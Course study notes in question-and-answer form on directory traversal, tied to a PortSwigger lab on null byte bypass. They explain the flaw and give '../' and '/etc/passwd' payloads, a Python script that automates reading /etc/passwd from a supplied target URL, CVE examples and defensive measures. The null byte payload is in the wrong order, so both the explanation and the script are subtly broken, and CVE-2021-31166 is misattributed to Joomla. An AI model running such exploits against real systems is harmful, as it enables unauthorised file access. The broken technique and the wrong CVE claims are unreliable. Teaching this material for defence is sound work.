---
course: Web Security
topic: Directory Traversal
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what a file path traversal vulnerability is and how it can be exploited.**

A file path traversal vulnerability occurs when an application uses untrusted input to construct a filename or filepath without proper validation. An attacker can manipulate this input to access arbitrary files on the server, including sensitive configuration files, source code, or other critical data. For instance, by using special characters such as `../`, an attacker can navigate up the directory tree to access files outside the intended directory. 

To exploit this vulnerability, an attacker might modify a URL parameter used to specify a file path, appending `../` sequences to traverse directories until reaching the desired file. For example, if an application expects a file path like `/images/image.jpg`, an attacker might change it to `/images/../../../../etc/passwd` to read the system's password file.

**Q2. How does null byte bypass work in the context of file path traversal?**

Null byte bypass is a technique used to evade certain types of input validation in file path traversal attacks. When an application checks for a specific file extension but does not properly handle null bytes (`\x00`), an attacker can append a null byte to the end of their malicious input. The null byte effectively terminates the string at that point, allowing the rest of the input to be ignored. This can bypass the validation logic and allow the attacker to access unintended files.

For example, if an application expects a `.jpg` file extension and checks for it, an attacker might craft an input like `image.jpg\x00/etc/passwd`. The null byte causes the server to treat the input as only `image.jpg`, bypassing the extension check, while still allowing the server to process the rest of the string, leading to unauthorized file access.

**Q3. Write a Python script to automate the exploitation of a file path traversal vulnerability using null byte bypass.**

```python
import sys
import requests
from urllib.parse import urljoin

def exploit_file_traversal(url):
    # Define the path to the vulnerable endpoint
    vulnerable_path = "/path/to/vulnerable/endpoint"
    
    # Construct the full URL with the exploit payload
    exploit_payload = "image.jpg%00/etc/passwd"
    full_url = urljoin(url, vulnerable_path + exploit_payload)
    
    # Perform the GET request
    response = requests.get(full_url, verify=False)
    
    # Check if the exploit was successful
    if "root:" in response.text:
        print("Exploit successful!")
        print("Content of /etc/passwd:")
        print(response.text)
    else:
        print("Exploit failed.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit_file_traversal(target_url)
```

This script automates the process of exploiting a file path traversal vulnerability using a null byte bypass. It constructs a URL with the exploit payload, sends a GET request, and checks the response to determine if the exploit was successful.

**Q4. Discuss recent real-world examples of file path traversal vulnerabilities and their impact.**

One notable example is the CVE-2021-39202 vulnerability found in the popular WordPress plugin WP Travel Engine. This vulnerability allowed attackers to exploit file path traversal to access sensitive files on the server, including configuration files and potentially sensitive user data. By manipulating the input parameters, attackers could traverse directories and read files outside the intended directory structure.

Another example is CVE-2021-31166, affecting the Joomla CMS. This vulnerability allowed attackers to upload arbitrary files and execute PHP code, leading to complete server compromise. The vulnerability was due to improper validation of uploaded files, allowing path traversal attacks to place files in arbitrary locations on the server.

These vulnerabilities highlight the importance of proper input validation and the potential severe consequences of failing to secure web applications against file path traversal attacks.

**Q5. How can developers prevent file path traversal vulnerabilities in their applications?**

Developers can prevent file path traversal vulnerabilities by implementing several security measures:

1. **Input Validation:** Ensure that all user inputs are validated against a strict whitelist of acceptable characters and patterns. Avoid using blacklists as they can be easily circumvented.

2. **Canonicalization:** Normalize paths before processing them. This involves resolving all symbolic links, converting relative paths to absolute paths, and removing unnecessary characters like `.` and `..`.

3. **Use Safe APIs:** Utilize built-in functions and libraries that are designed to handle file paths securely. For example, in PHP, use `realpath()` to resolve paths safely.

4. **Directory Restrictions:** Restrict file access to specific directories and ensure that the application cannot access files outside these directories. Use chroot jails or similar mechanisms to isolate the application environment.

5. **Least Privilege Principle:** Run the application with the least privileges necessary. This limits the damage that can be caused if a vulnerability is exploited.

By implementing these practices, developers can significantly reduce the risk of file path traversal vulnerabilities in their applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/11-Directory Traversal/07-Lab 6 File path traversal validation of file extension with null byte bypass/02-Directory Traversal Vulnerability|Directory Traversal Vulnerability]] | [[Web Security (PortSwigger)/11-Directory Traversal/07-Lab 6 File path traversal validation of file extension with null byte bypass/00-Overview|Overview]]
